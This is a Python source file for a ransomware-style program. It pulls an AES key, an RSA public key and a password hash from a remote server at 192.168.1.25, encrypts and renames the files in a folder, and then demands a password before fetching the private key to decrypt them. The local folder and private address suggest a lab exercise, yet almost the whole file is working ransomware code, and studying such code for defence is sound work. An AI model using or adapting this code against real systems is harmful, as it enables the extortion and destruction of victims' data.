
import urllib.request
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import time
import hashlib
import os
import glob
from Crypto.Cipher import AES
from multiprocessing import Process
import sys

global host
host = "192.168.1.25"

global hash_content
with urllib.request.urlopen(f"http://{host}/get_hash") as hash:
    hash_content = hash.read().decode("utf-8")

global symetric_key
with urllib.request.urlopen(f"http://{host}/get_sym") as key:
    symetric_key = key.read().decode("utf-8")


global public_key
with urllib.request.urlopen(f"http://{host}/") as key_file:
    public_key = serialization.load_pem_public_key(
        base64.b64decode(key_file.read()),
        backend=default_backend()
    )

global iv
iv = hash_content[:16].encode()

def encrypt_symetric(file_in,key):
    global iv
    with open(file_in,'rb') as file:
        data = file.read()
    key = key.encode()
    aes = AES.new(key, AES.MODE_CBC, iv)
    with open(file_in,"wb") as file:
        file.write(aes.encrypt((lambda s:s + b"\0" * (AES.block_size - len(s) % AES.block_size))(data)))
    os.rename(file_in,file_in+".encrypted_sym")

def decrypt_symetric(file_in,key):
    global iv
    with open(file_in, "rb") as file:
        data = file.read()
    v = key.encode()
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(data)
    with open(file_in,'wb') as file:
        file.write(plaintext.rstrip(b"\0"))
    os.rename(file_in,".".join(file_in.split(".")[:-1]))


def encrypt(file_in):

    global public_key

    with open(file_in,'rb') as file:
        message = file.read()

    encrypted = public_key.encrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open(file_in,"wb") as file:
        file.write(encrypted)
    os.rename(file_in,f"{file_in}.encrypted")

def hash_pass(passw):
    dk = hashlib.pbkdf2_hmac('sha256', bytes(str(base64.b64encode(bytes(passw,"utf-8"))),'utf-8'), bytes(str("qwerty"),"utf-8"), 100000)
    passwd = dk.hex()
    return passwd


def decrypt(file_in,private_key):


    with open(file_in,'rb') as file:
        encrypted = file.read()

    original_message = private_key.decrypt(
        encrypted,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open(file_in,'wb') as file:
        file.write(original_message)
    os.rename(file_in,".".join(file_in.split(".")[:-1]))

def encrypt_symetric_key(sym):
    global public_key
    encrypted = public_key.encrypt(
        sym.encode("utf-8"),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted

def decrypt_symetric_key(sym,private_key):
    original_message = private_key.decrypt(
        sym,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return original_message.decode("utf-8")


def encrypt_one_file(file):
    global symetric_key
    if ".encrypted" in str(file):
        return ""
    file_enc = file+".encrypted_sym"

    if not os.path.getsize(file)>958:
        encrypt(file) #Maximum size of the file : 958o
    else:
        encrypt_symetric(file,symetric_key)

def decrypt_one_file(file_enc,mdp,private_key,symetric_key):
    global host
    if ".encrypted_sym" in file_enc:
        decrypt_symetric(file_enc,symetric_key)
    elif ".encrypted" in file_enc:
        decrypt(file_enc,private_key)


to_encrypt=glob.glob("./to_encrypt/*")
for i in to_encrypt:
    worker = Process(target=encrypt_one_file, args=(i,))
    worker.start()
    worker.join()

symetric_key = encrypt_symetric_key(symetric_key)

mdp = ""
while hash_pass(mdp)!=hash_content:
    mdp = input("Entrez le mot de passe :")
with urllib.request.urlopen(f"http://{host}/decrypt?pass={mdp}") as key_file:
    try:
        private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None,
        backend=default_backend())
    except:
        print("[-] Key deleted from the database, data lost !")
        sys.exit(0)
symetric_key = decrypt_symetric_key(symetric_key,private_key)

for i in glob.glob("./to_encrypt/*"):
    if ".encrypted_sym" in i or ".encrypted" in i:
        decrypt_one_file(i,mdp,private_key,symetric_key)
